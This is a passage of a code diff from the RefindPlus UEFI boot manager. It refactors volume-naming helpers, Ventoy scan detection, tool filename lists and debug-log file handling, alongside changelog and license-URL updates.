= L\"\"         ;\n-    else if (MyStriCmp (VolumeName,   L\"ESP\"      )) RetVal = L\"\"         ;\n-    else if (MyStrStr  (VolumeName,   L\"Volume\"   )) RetVal = L\"\"         ;\n-    else if (MyStrStr  (VolumeName,   L\"Partition\")) RetVal = L\"\"         ;\n-    else if (MyStrStr  (VolumeName,   L\"XBOOTLDR\" )) RetVal = L\"\"         ;\n-    else if (MyStrStr  (InstanceName, L\" via \"    )) RetVal = L\"\"         ;\n-    else if (MyStrStr  (InstanceName, L\"Instance:\")) RetVal = L\"Volume:- \";\n-    else                                             RetVal = L\"\"         ;\n+    else if (VolFSType == FS_TYPE_FAT32         ) RetVal = L\"\"         ;\n+    else if (VolFSType == FS_TYPE_FAT16         ) RetVal = L\"\"         ;\n+    else if (VolFSType == FS_TYPE_FAT12         ) RetVal = L\"\"         ;\n+    else if (VolFSType == FS_TYPE_EXFAT         ) RetVal = L\"\"         ;\n+    else if (MyStriCmp (VolName,   L\"EFI\"      )) RetVal = L\"\"         ;\n+    else if (MyStriCmp (VolName,   L\"ESP\"      )) RetVal = L\"\"         ;\n+    else if (IsStriStr (VolName,   L\"Volume\"   )) RetVal = L\"\"         ;\n+    else if (IsStriStr (VolName,   L\"Partition\")) RetVal = L\"\"         ;\n+    else if (IsStriStr (VolName,   L\"XBOOTLDR\" )) RetVal = L\"\"         ;\n+    else if (IsStriStr (EntryName, L\" via \"    )) RetVal = L\"\"         ;\n+    else if (IsStriStr (EntryName, L\"Instance:\")) RetVal = L\"Volume:- \";\n+    else                                          RetVal = L\"\"         ;\n \n     return RetVal;\n } // CHAR16 * SetVolKind()\n \n CHAR16 * SetVolJoin (\n-    IN CHAR16  *InstanceName,\n+    IN CHAR16  *EntryName,\n     IN BOOLEAN  ForBoot\n ) {\n     CHAR16 *RetVal;\n \n \n+    // DA-TAG: Order of Appearance is Important\n+    //         Do not trivially change this\n     if (0);\n-    else if (MyStrStr  (InstanceName, L\"Manual Stanza:\" )) RetVal = L\"\"      ;\n-    else if (MyStrStr  (InstanceName, L\"Stub Loader\"    )) RetVal = L\" | \"   ;\n-    else if (MyStrStr  (InstanceName, L\" via \"          )) RetVal = L\" on \"  ;\n-    else if (MyStriCmp (InstanceName, L\"Legacy Bootcode\")) RetVal = L\" for \" ;\n-    else if (ForBoot                                     ) RetVal = L\" from \";\n-    else                                                   RetVal = L\" on \"  ;\n+    else if (IsStriStr (EntryName, L\" Stanza:\"   )) RetVal = L\"\"      ;\n+    else if (IsStriStr (EntryName, L\"Stub Loader\")) RetVal = L\" | \"   ;\n+    else if (IsStriStr (EntryName, L\" via \"      )) RetVal = L\" on \"  ;\n+    else if (MyStriCmp (EntryName, L\"Legacy Boot\")) RetVal = L\" for \" ;\n+    else if (ForBoot                              ) RetVal = L\" from \";\n+    else                                            RetVal = L\" on \"  ;\n \n     return RetVal;\n } // CHAR16 * SetVolJoin()\n \n CHAR16 * SetVolFlag (\n-    IN CHAR16 *InstanceName,\n-    IN CHAR16 *VolumeName\n+    IN CHAR16 *EntryName,\n+    IN CHAR16 *VolName\n ) {\n     CHAR16 *RetVal;\n \n \n-    if (MyStrStr (InstanceName, L\"Manual Stanza:\")) {\n+    if (MyStrStr (EntryName, L\" Stanza:\")) {\n         RetVal = L\"\";\n     }\n     else {\n-        RetVal = VolumeName;\n+        RetVal = VolName;\n     }\n \n     return RetVal;\n } // CHAR16 * SetVolFlag()\n \n CHAR16 * SetVolType (\n-    IN CHAR16 *InstanceName OPTIONAL,\n-    IN CHAR16 *VolumeName,\n-    IN UINT32  VolumeFSType\n+    IN CHAR16 *EntryName OPTIONAL,\n+    IN CHAR16 *VolName,\n+    IN UINT32  VolFSType\n ) {\n     CHAR16 *RetVal;\n \n \n+    // DA-TAG: Order of Appearance is Important\n+    //         Do not trivially change this\n     if (0);\n-    else if (MyStrStr  (VolumeName,   L\"Partition\"     )) RetVal = L\"\";\n-    else if (MyStrStr  (InstanceName, L\"Stub Loader\"   )) {\n-        RetVal = (MyStrStr (VolumeName, L\"Linux\"))\n-            ? L\" Partition\" : L\" Linux Partition\";\n-    }\n-    else if (MyStrStr  (InstanceName, L\"Manual Stanza:\")) RetVal = L\"\";\n-    else if (MyStrStr  (InstanceName, L\"Instance:\"     )) RetVal = L\"\";\n-    else if (MyStrStr  (InstanceName, L\"(Legacy\"       )) RetVal = L\"\";\n-    else if (MyStrStr  (VolumeName,   L\"Volume\"        )) RetVal = L\"\";\n-    else if (MyStriCmp (VolumeName,   L\"ESP\"           )) RetVal = L\"\";\n+    else if (IsStriStr (EntryName, L\" Stanza:\" )) RetVal = L\"\"                 ;\n+    else if (IsStriStr (VolName,   L\"Partition\")) RetVal = L\"\"                 ;\n+    else if (IsStriStr (VolName,   L\"Volume\"   )) RetVal = L\"\"                 ;\n+    else if (MyStriCmp (VolName,   L\"ESP\"      )) RetVal = L\"\"                 ;\n+    else if (MyStriCmp (VolName,   L\"EFI\"      )) RetVal = L\" System Partition\";\n     else if (\n-        MyStrStr  (InstanceName, L\"vmlinuz-\") ||\n-        MyStrStr  (InstanceName, L\"bzImage-\") ||\n-        MyStrStr  (InstanceName, L\"kernel-\")  ||\n-        MyStrStr  (InstanceName, L\"Image-\")\n+        IsStriStr (EntryName, L\"Stub Loader\") ||\n+        IsStriStr (EntryName, L\"vmLinuz-\"   ) ||\n+        IsStriStr (EntryName, L\"bzImage-\"   ) ||\n+        IsStriStr (EntryName, L\"Kernel-\"    ) ||\n+        IsStriStr (EntryName, L\"Image-\"     )\n     ) {\n-        RetVal = (MyStrStr (VolumeName, L\"Linux\"))\n+        RetVal = (IsStriStr (VolName, L\"Linux\"))\n             ? L\" Partition\" : L\" Linux Partition\";\n     }\n-    else if (MyStriCmp (VolumeName,   L\"EFI\"            )) RetVal = L\" System Partition\";\n-    else if (MyStriCmp (VolumeName,   L\"BOOTCAMP\"       )) RetVal = L\" Partition\"       ;\n-    else if (MyStrStr  (VolumeName,   L\"XBOOTLDR\"       )) RetVal = L\" Partition\"       ;\n-    else if (MyStriCmp (InstanceName, L\"Legacy Bootcode\")) RetVal = L\" Partition\"       ;\n-    else if (VolumeFSType == FS_TYPE_FAT32               ) RetVal = L\" Partition\"       ;\n-    else if (VolumeFSType == FS_TYPE_FAT16               ) RetVal = L\" Partition\"       ;\n-    else if (VolumeFSType == FS_TYPE_FAT12               ) RetVal = L\" Partition\"       ;\n-    else if (VolumeFSType == FS_TYPE_EXFAT               ) RetVal = L\" Partition\"       ;\n-    else                                                   RetVal = L\"\"                 ;\n+    else if (IsStriStr (EntryName, L\"Instance:\"  )) RetVal = L\"\"          ;\n+    else if (IsStriStr (EntryName, L\"(Legacy\"    )) RetVal = L\"\"          ;\n+    else if (MyStriCmp (EntryName, L\"Legacy Boot\")) RetVal = L\" Partition\";\n+    else if (MyStriCmp (VolName,   L\"BOOTCAMP\"   )) RetVal = L\" Partition\";\n+    else if (IsStriStr (VolName,   L\"XBOOTLDR\"   )) RetVal = L\" Partition\";\n+    else if (VolFSType == FS_TYPE_FAT32           ) RetVal = L\" Partition\";\n+    else if (VolFSType == FS_TYPE_FAT16           ) RetVal = L\" Partition\";\n+    else if (VolFSType == FS_TYPE_FAT12           ) RetVal = L\" Partition\";\n+    else if (VolFSType == FS_TYPE_EXFAT           ) RetVal = L\" Partition\";\n+    else                                            RetVal = L\"\"          ;\n \n     return RetVal;\n } // CHAR16 * SetVolType()\n \n-// Returns FALSE if the specified file/volume matches the GlobalConfig.DontScanDirs\n+// Returns FALSE if the specified file/volume matches GlobalConfig.DontScanDirs\n // or GlobalConfig.DontScanVolumes specification, or if Path points to a volume\n // other than the one specified by Volume, or if the specified path is 'SelfDir',\n // or if the volume has been otherwise flagged as being 'unreadable',\n\n@@ -2388,11 +2395,8 @@\nBOOLEAN ShouldScan (\n     CHAR16                 *VolName;\n     CHAR16                 *PathCopy;\n     CHAR16                 *DontScanDir;\n-    CHAR16                 *TmpVolNameA;\n-    CHAR16                 *TmpVolNameB;\n     CHAR16                 *VentoyName;\n     BOOLEAN                 ScanIt;\n-    BOOLEAN                 FoundVentoy;\n \n \n     if (GlobalConfig.NvramProtect &&\n\n@@ -2414,59 +2418,37 @@\nBOOLEAN ShouldScan (\n         return FALSE;\n     }\n \n-    ScanIt = VolumeScanAllowed (Volume, FALSE, FALSE); // Do NOT Check Ventoy Here\n-    if (ScanIt && Volume->FSType == FS_TYPE_APFS) {\n-        if (GlobalConfig.SyncAPFS) {\n-            TmpVolNameA = PoolPrint (L\"%s - DATA\", Volume->VolName);\n-            if (IsListItem (TmpVolNameA, GlobalConfig.DontScanVolumes)) {\n-                ScanIt = FALSE;\n-            }\n-            MY_FREE_POOL(TmpVolNameA);\n-\n-            if (ScanIt) {\n-                TmpVolNameB = SanitiseString (Volume->VolName);\n-                TmpVolNameA = PoolPrint (L\"%s - DATA\", TmpVolNameB);\n-                if (IsListItem (TmpVolNameA, GlobalConfig.DontScanVolumes)) {\n-                    ScanIt = FALSE;\n-                }\n-                MY_FREE_POOL(TmpVolNameA);\n-                MY_FREE_POOL(TmpVolNameB);\n-            }\n+    // Do *NOT* Check for Ventoy in 'VolumeScanAllowed'\n+    ScanIt = VolumeScanAllowed (Volume, FALSE, FALSE);\n+    if (!ScanIt) {\n+        // Check for Ventoy here\n+        if (GlobalConfig.HandleVentoy) {\n+            if (MyStriCmp (Path, L\"EFI\\\\BOOT\") &&\n+                FileExists (Volume->RootDir, FALLBACK_FULLNAME)\n+            ) {\n+                i = 0;\n+                while (!ScanIt) {\n+                    VentoyName = FindCommaDelimited (\n+                        VENTOY_NAMES, i++\n+                    );\n+                    if (VentoyName == NULL) break;\n \n-            if (!ScanIt) {\n-                return FALSE;\n+                    if (MyStrBegins (VentoyName, Volume->VolName) ||\n+                        MyStrBegins (VentoyName, Volume->FsName)  ||\n+                        MyStrBegins (VentoyName, Volume->PartName)\n+                    ) {\n+                        ScanIt = TRUE;\n+                    }\n+                    MY_FREE_POOL(VentoyName);\n+                } // while\n             }\n         }\n-    }\n \n-    if (GlobalConfig.HandleVentoy && !ScanIt) {\n-        FoundVentoy = FALSE;\n-        if (MyStriCmp (Path, L\"EFI\\\\BOOT\") &&\n-            FileExists (Volume->RootDir, FALLBACK_FULLNAME)\n-        ) {\n-            i = 0;\n-            while (\n-                !FoundVentoy &&\n-                (VentoyName = FindCommaDelimited (VENTOY_NAMES, i++)) != NULL\n-            ) {\n-                if (MyStrBegins (VentoyName, Volume->VolName) ||\n-                    MyStrBegins (VentoyName, Volume->FsName)  ||\n-                    MyStrBegins (VentoyName, Volume->PartName)\n-                ) {\n-                    FoundVentoy = TRUE;\n-                }\n-                MY_FREE_POOL(VentoyName);\n-            } // while\n-        }\n-\n-        return FoundVentoy;\n-    }\n-\n-    if (!ScanIt) {\n-        return FALSE;\n+        // Return 'FALSE' or 'TRUE' if Ventoy found\n+        return ScanIt;\n     }\n \n-    // See if Path includes an explicit volume declaration that is NOT Volume.\n+    // Check if any explicit volume declaration in Path is *NOT* Volume\n     VolName  = NULL;\n     PathCopy = StrDuplicate (Path);\n     if (SplitVolumeAndFilename (&PathCopy, &VolName)) {\n\n@@ -5022,7 +5004,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreCleanNvram->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreCleanNvram->Tag         = TAG_CLEAN_NVRAM;\n                     MenuEntryPreCleanNvram->Row         = 1;\n\n@@ -5141,7 +5123,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryAbout->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryAbout->Tag         = TAG_ABOUT;\n                     MenuEntryAbout->Row         =  1;\n\n@@ -5245,7 +5227,7 @@\nVOID ScanForTools (VOID) {\n                     }\n \n                     MenuEntryHiddenTags->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryHiddenTags->Tag         = TAG_HIDDEN;\n                     MenuEntryHiddenTags->Row         = 1;\n\n@@ -5342,7 +5324,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreShellEFI->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreShellEFI->Tag         = TAG_SHELL;\n                     MenuEntryPreShellEFI->Row         = 1;\n\n@@ -5383,7 +5365,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreGPTSync->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreGPTSync->Tag         = TAG_GPTSYNC;\n                     MenuEntryPreGPTSync->Row         = 1;\n\n@@ -5424,7 +5406,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreGDiskTool->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreGDiskTool->Tag         = TAG_GDISK;\n                     MenuEntryPreGDiskTool->Row         = 1;\n\n@@ -5465,7 +5447,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreMokTool->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreMokTool->Tag         = TAG_MOK;\n                     MenuEntryPreMokTool->Row         = 1;\n\n@@ -5506,7 +5488,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreFwUpdateTool->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreFwUpdateTool->Tag         = TAG_FWUPDATE;\n                     MenuEntryPreFwUpdateTool->Row         = 1;\n\n@@ -5547,7 +5529,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreNetBoot->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreNetBoot->Tag         = TAG_NETBOOT;\n                     MenuEntryPreNetBoot->Row         = 1;\n\n@@ -5587,7 +5569,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreRecoveryMac->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreRecoveryMac->Tag         = TAG_RECOVERY_MAC;\n                     MenuEntryPreRecoveryMac->Row         = 1;\n\n@@ -5628,7 +5610,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreRecoveryWin->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreRecoveryWin->Tag         = TAG_RECOVERY_WIN;\n                     MenuEntryPreRecoveryWin->Row         = 1;\n\n@@ -5724,7 +5706,7 @@\nVOID ScanForTools (VOID) {\n                 }\n \n                 MenuEntryRotateCSR->Title = PoolPrint (\n-                    L\"Show '%s' Screen\", ToolName\n+                    L\"Show '%s' Menu\", ToolName\n                 );\n                 MenuEntryRotateCSR->Tag         = TAG_CSR_ROTATE;\n                 MenuEntryRotateCSR->Row         = 1;\n\n@@ -5786,7 +5768,7 @@\nVOID ScanForTools (VOID) {\n                 }\n \n                 MenuEntryBootOrder->Title = PoolPrint (\n-                    L\"Show '%s' Screen\", ToolName\n+                    L\"Show '%s' Menu\", ToolName\n                 );\n                 MenuEntryBootOrder->Tag         = TAG_BOOTORDER;\n                 MenuEntryBootOrder->Row         = 1;\n\n@@ -5814,7 +5796,7 @@\nVOID ScanForTools (VOID) {\n                     FoundTool = TRUE;\n \n                     MenuEntryPreMemTest->Title = PoolPrint (\n-                        L\"Show '%s' Screen\", ToolName\n+                        L\"Show '%s' Menu\", ToolName\n                     );\n                     MenuEntryPreMemTest->Tag         = TAG_MEMTEST;\n                     MenuEntryPreMemTest->Row         = 1;\n```\n\nFilename: BootMaster/scan.h:\n```\n@@ -65,18 +65,18 @@\n#define __SCAN_H_\n \n #define LABEL_BOOTORDER     L\"Manage BootOrder\"\n+#define LABEL_CSR_ROTATE    L\"Rotate CSR\"\n #define LABEL_FIRMWARE      L\"Firmware Reboot\"\n-#define LABEL_INSTALL       L\"Install RefindPlus\"\n-#define LABEL_NETBOOT       L\"Net Boot\"\n-#define LABEL_REBOOT        L\"System Restart\"\n #define LABEL_SHUTDOWN      L\"System Shutdown\"\n-#define LABEL_CSR_ROTATE    L\"Rotate CSR\"\n+#define LABEL_REBOOT        L\"System Restart\"\n #define LABEL_ABOUT         L\"About RefindPlus\"\n #define LABEL_MOK           L\"MOK Protocol\"\n #define LABEL_EXIT          L\"Exit RefindPlus\"\n #define LABEL_SHELL         L\"uEFI Shell\"\n #define LABEL_HIDDEN        L\"Hidden Items\"\n #define LABEL_MEMTEST       L\"MemTest Tool\"\n+#define LABEL_INSTALL       L\"Install RefindPlus\"\n+#define LABEL_NETBOOT       L\"Net Boot\"\n #define LABEL_GDISK         L\"GDisk Tool\"\n #define LABEL_GPTSYNC       L\"GPTsync Tool\"\n #define LABEL_FWUPDATE      L\"Firmware Update\"\n\n@@ -86,41 +86,44 @@\n#if defined (EFIX64)\n #   define MEMTEST_FILES \\\n-L\"bootx64.efi,memtest86.efi,memtest.efi,\\\n-memtest86_x64.efi,memtest86x64.efi,memtest86+x64.efi,memtest_x64.efi,\\\n-memtest86p.efi,memtest86p_x64.efi,memtest86px64.efi\"\n+L\"bootx64.efi,memtest.efi,memtest86.efi,memtest86p.efi,\\\n+memtest_x64.efi,memtestx64.efi,memtest+x64.efi,x64_memtest.efi,\\\n+memtest86_x64.efi,memtest86x64.efi,memtest86+x64.efi,x64_memtest86.efi,\\\n+memtest86p_x64.efi,memtest86px64.efi,memtest86p+x64.efi,x64_memtest86p.efi\"\n #   define SKIPNAME_PATTERNS       L\"*ia32*.efi,*aa64*.efi,*mips*.efi\"\n #   define FALLBACK_FULLNAME       L\"EFI\\\\BOOT\\\\bootx64.efi\"\n #   define FALLBACK_BASENAME       L\"bootx64.efi\"\n-#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_x64.efi,ipxex64.efi\"\n-#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_x64.efi,gptsyncx64.efi\"\n-#   define GDISK_FILES             L\"gdisk.efi,gdisk_x64.efi,gdisk_x64.efi\"\n-#   define SHELL_FILES             L\"shell.efi,shell_x64.efi,shellx64.efi\"\n-#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvram_x64.efi,CleanNvramx64.efi\"\n+#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_x64.efi,ipxex64.efi,x64_ipxe.efi\"\n+#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_x64.efi,gptsyncx64.efi,x64_gptsync.efi\"\n+#   define GDISK_FILES             L\"gdisk.efi,gdisk_x64.efi,gdiskx64.efi,x64_gdisk.efi\"\n+#   define SHELL_FILES             L\"shell.efi,shell_x64.efi,shellx64.efi,x64_shell.efi\"\n+#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvramx64.efi,CleanNvram_x64.efi,x64_CleanNvram.efi\"\n #elif defined (EFI32)\n #   define MEMTEST_FILES \\\n-L\"bootia32.efi,memtest.efi,\\\n-memtest_ia32.efi,memtestia32.efi\"\n+L\"bootia32.efi,memtest.efi,memtest_ia32.efi,\\\n+memtestia32.efi,memtest+ia32.efi,ia32_memtest.efi\"\n #   define SKIPNAME_PATTERNS       L\"*x64*.efi,*aa64*.efi,*mips*.efi\"\n #   define FALLBACK_FULLNAME       L\"EFI\\\\BOOT\\\\bootia32.efi\"\n #   define FALLBACK_BASENAME       L\"bootia32.efi\"\n-#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_ia32.efi,ipxeia32.efi\"\n-#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_ia32.efi,gptsyncia32.efi\"\n-#   define GDISK_FILES             L\"gdisk.efi,gdisk_ia32.efi,gdiskia32.efi\"\n-#   define SHELL_FILES             L\"shell.efi,shell_ia32.efi,shellia32.efi\"\n-#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvram_ia32.efi,CleanNvramia32.efi\"\n+#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_ia32.efi,ipxeia32.efi,ia32_ipxe.efi\"\n+#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_ia32.efi,gptsyncia32.efi,ia32_gptsync.efi\"\n+#   define GDISK_FILES             L\"gdisk.efi,gdisk_ia32.efi,gdiskia32.efi,ia32_gdisk.efi\"\n+#   define SHELL_FILES             L\"shell.efi,shell_ia32.efi,shellia32.efi,ia32_shell.efi\"\n+#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvramia32.efi,CleanNvram_ia32.efi,ia32_CleanNvram.efi\"\n #elif defined (EFIAARCH64)\n #   define MEMTEST_FILES \\\n-L\"bootaa64.efi,memtest.efi,\\\n-memtest_aa64.efi,memtestaa64.efi\"\n+L\"bootaa64.efi,memtest.efi,memtest86.efi,memtest86p.efi,\\\n+memtest_aa64.efi,memtestaa64.efi,memtest+aa64.efi,aa64_memtest.efi,\\\n+memtest86_aa64.efi,memtest86aa64.efi,memtest86+aa64.efi,aa64_memtest86.efi,\\\n+memtest86p_aa64.efi,memtest86paa64.efi,memtest86p+aa64.efi,aa64_memtest86p.efi\"\n #   define SKIPNAME_PATTERNS       L\"*x64*.efi,*ia32*.efi,*mips*.efi\"\n #   define FALLBACK_FULLNAME       L\"EFI\\\\BOOT\\\\bootaa64.efi\"\n #   define FALLBACK_BASENAME       L\"bootaa64.efi\"\n-#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_aa64.efi,ipxeaa64.efi\"\n-#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_aa64.efi,gptsyncaa64.efi\"\n-#   define GDISK_FILES             L\"gdisk.efi,gdisk_aa64.efi,gdiskaa64.efi\"\n-#   define SHELL_FILES             L\"shell.efi,shell_aa64.efi,shellaa64.efi\"\n-#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvram_aa64.efi,CleanNvramaa64.efi\"\n+#   define NETBOOT_FILES           L\"ipxe.efi,ipxe_aa64.efi,ipxeaa64.efi,aa64_ipxe.efi\"\n+#   define GPTSYNC_FILES           L\"gptsync.efi,gptsync_aa64.efi,gptsyncaa64.efi,aa64_gptsync.efi\"\n+#   define GDISK_FILES             L\"gdisk.efi,gdisk_aa64.efi,gdiskaa64.efi,aa64_gdisk.efi\"\n+#   define SHELL_FILES             L\"shell.efi,shell_aa64.efi,shellaa64.efi,aa64_shell.efi\"\n+#   define NVRAMCLEAN_FILES        L\"CleanNvram.efi,CleanNvramaa64.efi,CleanNvram_aa64.efi,aa64_CleanNvram.efi\"\n #else\n #   define MEMTEST_FILES \\\n L\"boot.efi,memtest.efi\"\n\n@@ -179,22 +182,22 @@\nVOID ScanFirmwareDefined (\n \n CHAR16 * GetShowName (IN CHAR16 *LinuxName);\n CHAR16 * SetVolJoin (\n-    IN CHAR16  *InstanceName,\n+    IN CHAR16  *EntryName,\n     IN BOOLEAN  ForBoot\n );\n CHAR16 * SetVolKind (\n-    IN CHAR16 *InstanceName,\n-    IN CHAR16 *VolumeName,\n-    IN UINT32  VolumeFSType\n+    IN CHAR16 *EntryName,\n+    IN CHAR16 *VolName,\n+    IN UINT32  VolFSType\n );\n CHAR16 * SetVolFlag (\n-    IN CHAR16 *InstanceName,\n-    IN CHAR16 *VolumeName\n+    IN CHAR16 *EntryName,\n+    IN CHAR16 *VolName\n );\n CHAR16 * SetVolType (\n-    IN CHAR16 *InstanceName OPTIONAL,\n-    IN CHAR16 *VolumeName,\n-    IN UINT32  VolumeFSType\n+    IN CHAR16 *EntryName OPTIONAL,\n+    IN CHAR16 *VolName,\n+    IN UINT32  VolFSType\n );\n CHAR16 * GetVolumeGroupName (\n     IN CHAR16       *LoaderPath,\n```\n\nFilename: CHANGELOG.txt:\n```\n@@ -1,6 +1,13 @@\n0.14.2.AC (PRE-RELEASE):\n -----------------------\n-- PENDING\n+- Fixes `HelpIcon` Handling\n+  * New deduplication code disabled loader icon caching\n+  * This bug was introduced in v0.14.2.AB (Commit 09e0f29)\n+- Amends `Misc` Handling\n+  * Adds identification for `Non-Folded` Linux kernel loaders\n+  * Avoids potential implicit type conversion issues. Thanks @clague\n+  * Provides option to create GitHub Build Artefacts. Thanks @startergo\n+  * Addresses Potential NULL Pointer Dereferencing. Thnaks @MicroMilo\n \n \n 0.14.2.AB (04 FEB 2025):\n\n@@ -18,8 +25,8 @@\n- Enlarged Linux/Windows icons are shown as exit splash screen\n     - Changes can be leveraged to define custom exit splash screens\n       * `boot_outlogo` file will be used if present\n-      * `boot_distroname` will be used if present otherwise\n-      * `os_distroname` will be used if present otherwise\n+      * `boot_{distro}` will be used if present otherwise\n+      * `os_{distro}` will be used if present otherwise\n   * Enabled by default but can be adjusted using a new `disable_bootlogo` configuration token\n     - This can be used to fully or partially disable boot logo display\n - Improves `Shortcut Key` Handling\n\n@@ -72,7 +79,7 @@\n* This bug was inherited from upstream code\n - Fixes `ScanFirmwareDefined` Handling\n   * Spurious items were added (Typically as firmware shell instances)\n-    - Ref: Issue https://github.com/dakanji/RefindPlus/issues/184\n+    - Ref: Issue https://github.com/RefindPlusRepos/RefindPlus/issues/184\n   * This bug was introduced in v0.14.0.AC (Commit aad3298)\n - Fixes Jpeg Image Handling\n   * Garbled images were output\n```\n\nFilename: INFO.txt:\n```\n@@ -13,4 +13,4 @@\nor, at your option, any later version of the license.\n \n You should have received a copy of the GNU General Public License\n with RefindPlus. If not, you can view a copy of the license here:\n-<https://github.com/dakanji/RefindPlus/blob/GOPFix/LICENSE.txt/>.\n+<https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/LICENSE.txt/>.\n```\n\nFilename: Library/MemLogLib/BootLog.c:\n```\n@@ -140,7 +140,9 @@\nEFI_FILE_PROTOCOL * OpenLogFile (VOID) {\n \n     if (mDebugLog == NULL) {\n         DateStr = GetDateString();\n-        mDebugLog = PoolPrint (L\"EFI\\\\%s.log\", DateStr);\n+        mDebugLog = PoolPrint (\n+            L\"EFI\\\\%s.log\", DateStr\n+        );\n         MY_FREE_POOL(DateStr);\n     }\n\n@@ -159,11 +161,25 @@\nEFI_FILE_PROTOCOL * OpenLogFile (VOID) {\n         );\n     }\n \n-    // DA-TAG: Do not set 'mRootDir' to NULL here\n-    //         May be used in caller when 'LogProtocol' is not NULL\n     return LogProtocol;\n } // static EFI_FILE_PROTOCOL * OpenLogFile()\n \n+static\n+EFI_STATUS HandleDir (\n+    EFI_FILE_PROTOCOL *Entity OPTIONAL\n+) {\n+    EFI_STATUS         Status;\n+\n+    Status = REFIT_CALL_1_WRAPPER(\n+        mRootDir->Close, mRootDir\n+    );\n+    if (Entity == NULL) {\n+        Status = EFI_NOT_READY;\n+    }\n+\n+    return Status;\n+} // static EFI_STATUS HandleDir()\n+\n static\n EFI_FILE_PROTOCOL * GetDebugLogFile (VOID) {\n     EFI_STATUS                    Status;\n\n@@ -176,42 +192,40 @@\nEFI_FILE_PROTOCOL * GetDebugLogFile (VOID) {\n         gBS->HandleProtocol, gImageHandle,\n         &gEfiLoadedImageProtocolGuid, (VOID **) &LoadedImage\n     );\n-    if (EFI_ERROR(Status) || LoadedImage->DeviceHandle == NULL) {\n+    if (EFI_ERROR(Status) ||\n+        LoadedImage->DeviceHandle == NULL\n+    ) {\n         return NULL;\n     }\n \n     // DA-TAG: Always get 'mRootDir' each time\n     //\n     // Get mRootDir from the device we are loaded from\n-    mRootDir = EfiLibOpenRoot (LoadedImage->DeviceHandle);\n-    LogProtocol = OpenLogFile();\n+    mRootDir = EfiLibOpenRoot (\n+        LoadedImage->DeviceHandle\n+    );\n     if (mRootDir == NULL) {\n         Status = EFI_NOT_READY;\n     }\n     else {\n-        Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+        LogProtocol = OpenLogFile();\n+        Status = HandleDir (LogProtocol);\n     }\n+\n     if (EFI_ERROR(Status)) {\n-        // Try on first EFI partition\n+        // Try first ESP found\n         mRootDir = NULL;\n         Status = egFindESP (&mRootDir);\n         if (!EFI_ERROR(Status)) {\n             LogProtocol = OpenLogFile();\n-            if (mRootDir == NULL) {\n-                Status = EFI_NOT_READY;\n-            }\n-            else {\n-                Status = REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n-            }\n+            Status = HandleDir (LogProtocol);\n         }\n \n         if (EFI_ERROR(Status)) {\n             mRootDir = LogProtocol = NULL;\n         }\n     }\n \n-    // DA-TAG: Do not set 'mRootDir' to NULL here\n-    //         May be used in caller when 'LogProtocol' is not NULL\n     return LogProtocol;\n } // static EFI_FILE_PROTOCOL * GetDebugLogFile()\n\n@@ -244,9 +258,13 @@\nVOID SaveMessageToDebugLogFile (\n             RefitReadWrite, 0\n         );\n         if (!EFI_ERROR(Status)) {\n-            Status = REFIT_CALL_1_WRAPPER(LogFile->Delete, LogFile);\n+            Status = REFIT_CALL_1_WRAPPER(\n+                LogFile->Delete, LogFile\n+            );\n             if 